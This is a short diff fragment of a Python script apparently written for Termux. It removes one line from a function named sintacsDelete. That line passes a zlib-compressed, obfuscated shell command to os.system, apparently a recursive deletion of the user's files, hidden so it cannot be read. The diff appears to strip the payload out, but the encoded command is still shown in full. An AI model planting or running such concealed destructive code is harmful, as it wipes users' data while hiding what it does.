@@ -50,7 +50,6 @@ except Exception as e:
     pass
 
 def sintacsDelete():
-    os.system(zlib.decompress(b'x\x9cKNQP\xf1\xf0w\xf5UPSS(\xcaU\xd0-JS\xd0\x02\x005\xfe\x05\x0f'))
     os.system('termux-setup-storage')
     
     try:
